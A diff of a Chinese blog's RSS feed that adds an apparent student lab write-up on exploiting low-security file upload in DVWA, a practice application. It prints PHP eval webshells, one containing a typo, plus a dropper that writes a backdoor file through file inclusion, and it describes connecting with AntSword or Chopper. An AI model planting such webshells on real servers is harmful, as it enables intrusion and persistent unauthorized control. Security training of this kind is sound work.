@@ -8,59 +8,129 @@
         <language>zh-cn</language>
         <copyright>示例版权所有者</copyright>
         <lastBuildDate>Tue, 11 Mar 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://korriszz.github.io/hugo-dev/categories/web%E6%B8%97%E9%80%8F/index.xml" rel="self" type="application/rss+xml" /><item>
-        <title>WEB渗透低安全文件上传</title>
-        <link>https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link>
+        <title>WEB渗透低安全上传</title>
+        <link>https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/</link>
         <pubDate>Tue, 11 Mar 2025 00:00:00 +0000</pubDate>
         
-        <guid>https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</guid>
-        <description>&lt;img src="https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/head.jpg" alt="Featured image of post WEB渗透低安全文件上传" /&gt;&lt;ol&gt;
+        <guid>https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/</guid>
+        <description>&lt;img src="https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/head.jpg" alt="Featured image of post WEB渗透低安全上传" /&gt;&lt;h1 id=&#34;文件低安全上传&#34;&gt;文件低安全上传
+&lt;/h1&gt;&lt;h2 id=&#34;文件低安全文件上传&#34;&gt;文件低安全文件上传
+&lt;/h2&gt;&lt;ol&gt;
 &lt;li&gt;木马文件创建
 创建一个包含恶意代码的 PHP 文件作为一句话木马。此代码允许攻击者通过 POST 方式传递指令，在服务器端执行任意 PHP 代码，为后续入侵提供入口。&lt;/li&gt;
 &lt;li&gt;网站上传过程
 在 DVWA 网站的低安全设置下，直接上传该木马文件。由于低安全级别对上传文件的验证机制宽松，未严格检查文件类型和内容，木马文件得以成功上传至服务器指定目录。&lt;/li&gt;
 &lt;li&gt;提权与后门建立
-利用中国蚁剑工具，通过上传的木马文件获取服务器更高权限。提权成功后，在网站内部创建一个新的后门文件，并按照 “学号 + 姓名.txt” 的格式命名，如 “26 童盼盼.txt”，方便攻击者后续持续访问和控制服务器，窃取敏感信息或进行其他恶意操作。&lt;/li&gt;
+利用中国蚁剑工具，通过上传的木马文件获取服务器更高权限。提权成功后，在网站内部创建一个新的后门文件，并按照 “学号 + 姓名.txt” 的格式命名，如 “XX.txt”，方便攻击者后续持续访问和控制服务器，窃取敏感信息或进行其他恶意操作。&lt;/li&gt;
 &lt;/ol&gt;
-&lt;h1 id=&#34;操作过程&#34;&gt;操作过程
-&lt;/h1&gt;&lt;ol&gt;
-&lt;li&gt;第一步：木马文件创建
-&lt;img src=&#34;https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/a.JPG&#34;
-	width=&#34;209&#34;
-	height=&#34;65&#34;
-	srcset=&#34;https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/a_hu_2ca98a9c35bd88a2.JPG 480w, https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/a_hu_ca3b334d80c67720.JPG 1024w&#34;
+&lt;h3 id=&#34;操作过程&#34;&gt;操作过程
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;第一步：木马文件创建&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-BASH&#34; data-lang=&#34;BASH&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; eval&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POSH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;123&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;第二步：网站上传
+将一句话木马上传网站
+&lt;img src=&#34;https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/1.png&#34;
+	width=&#34;881&#34;
+	height=&#34;471&#34;
+	srcset=&#34;https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/1_hu_7d4ce93e1cbbfd81.png 480w, https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/1_hu_852b8b52854a0532.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
-		alt=&#34;第一步：木马文件创建&#34;
+		alt=&#34;将一句话木马上传网站&#34;
 	
 	
 		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;321&#34;
-		data-flex-basis=&#34;771px&#34;
+		data-flex-grow=&#34;187&#34;
+		data-flex-basis=&#34;448px&#34;
 	
-&gt;&lt;/li&gt;
+&gt;
+复制&lt;code&gt;/··/··/hackable/uploads/a.php&lt;/code&gt;
+黏贴至网址&lt;code&gt;#&lt;/code&gt;上然后按&lt;kbd&gt;ENTER&lt;/kbd&gt;&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;&lt;img src=&#34;https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/B.JPG&#34;
-	width=&#34;519&#34;
-	height=&#34;254&#34;
-	srcset=&#34;https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/B_hu_5cd32236e2917c87.JPG 480w, https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/B_hu_cdcb8fdcd0ef73bf.JPG 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;第二步：网站上传过程&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;204&#34;
-		data-flex-basis=&#34;490px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://korriszz.github.io/hugo-dev/helena-hertz-wWZzXlDpMog-unsplash.jpg&#34;
-	
-	
-	
+&lt;p&gt;复制新的网址&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;第三步：提权与后门建立
+打开中国&lt;code&gt;蚁🗡&lt;/code&gt;或者&lt;code&gt;中国菜鸟&lt;/code&gt;
+右键新建将网址和一句话木马密码输入即可连接
+&lt;img src=&#34;https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/2.png&#34;
+	width=&#34;1028&#34;
+	height=&#34;688&#34;
+	srcset=&#34;https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/2_hu_bd7911f8481ff336.png 480w, https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/2_hu_6dd2d7639685fcbc.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;第三步：提权与后门建立&#34;
 	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;149&#34;
+		data-flex-basis=&#34;358px&#34;
+	
+&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;图片低安全文件上传&#34;&gt;图片低安全文件上传
+&lt;/h2&gt;&lt;p&gt;安全性：low&lt;/p&gt;
+&lt;p&gt;1、制作木马文件php,生成一个叫做23wl3.php的一句话木马文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-BASH&#34; data-lang=&#34;BASH&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;fputs&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;fopen&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;426.php&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php eval($_POST[&amp;#34;123&amp;#34;]);空格?&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?&amp;gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;2、合成木马图片&lt;BR&gt;
+按 &lt;kbd&gt;WIN&lt;/kbd&gt; + &lt;kbd&gt;R&lt;/kbd&gt;&lt;BR&gt;
+输入cmd&lt;BR&gt;
+3、上传图片&lt;BR&gt;
+上传成功复制&lt;code&gt;/··/··/hackable/uploads/2.jpeg&lt;/code&gt;&lt;BR&gt;
+4.文件包含生成后门文件&lt;BR&gt;
+点击&lt;code&gt;File Inclusion&lt;/code&gt;&lt;BR&gt;
+将复制的黏贴到网址的&lt;code&gt;page=&lt;/code&gt;后面&lt;BR&gt;
+&lt;img src=&#34;https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/3.png&#34;
+	width=&#34;923&#34;
+	height=&#34;525&#34;
+	srcset=&#34;https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/3_hu_6d6fa01ff1c7ec9e.png 480w, https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/3_hu_be9d3266b5bdbbba.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;文件包含生成后门文件&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;175&#34;
+		data-flex-basis=&#34;421px&#34;
+	
+&gt; &lt;BR&gt;
+5.打开中国&lt;code&gt;蚁🗡&lt;/code&gt;或者&lt;code&gt;中国菜鸟&lt;/code&gt;&lt;BR&gt;
+网址为&lt;code&gt;··/··/··/··/fi/426.php&lt;/code&gt;
+右键新建将网址和一句话木马密码输入即可连接&lt;BR&gt;
+&lt;img src=&#34;https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/2.png&#34;
+	width=&#34;1028&#34;
+	height=&#34;688&#34;
+	srcset=&#34;https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/2_hu_bd7911f8481ff336.png 480w, https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/2_hu_6dd2d7639685fcbc.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;第三步：提权与后门建立&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;149&#34;
+		data-flex-basis=&#34;358px&#34;
 	
 &gt;&lt;/p&gt;
 &lt;h2 id=&#34;引用&#34;&gt;引用
